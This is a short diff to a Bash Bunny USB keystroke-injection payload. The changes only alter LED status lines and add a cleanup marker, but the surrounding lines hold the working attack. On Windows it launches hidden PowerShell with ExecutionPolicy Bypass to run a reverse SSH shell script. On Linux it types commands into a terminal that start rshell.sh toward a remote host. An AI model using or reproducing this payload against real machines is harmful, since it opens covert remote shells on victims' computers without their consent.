@@ -84,7 +84,8 @@ ATTACKMODE HID STORAGE
 LED STAGE2
 if [ "$OS" = "WIN" ]; then
     RUN WIN powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Add-Type -AssemblyName System.Windows.Forms; .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\library\\RemoteAccess\\ReverseSSH\\WinRSSH-Shell.ps1') $RHOST $RPORT $USE_CF $PUBKEY"
-    LED FINISH
+    
+    LED SPECIAL
     exit 0
 elif [ "$OS" = "LINUX" ]; then
     Q CTRL-ALT t
@@ -93,8 +94,11 @@ elif [ "$OS" = "LINUX" ]; then
     Q ENTER
     Q STRING "chmod +x ~/rshell.sh && ~/rshell.sh $RHOST $RPORT '$PUBKEY'"
     Q ENTER
+
+    LED CLEANUP
     Q STRING "exit"
     Q ENTER
-    LED FINISH
+
+    LED SPECIAL2
     exit 0
 fi
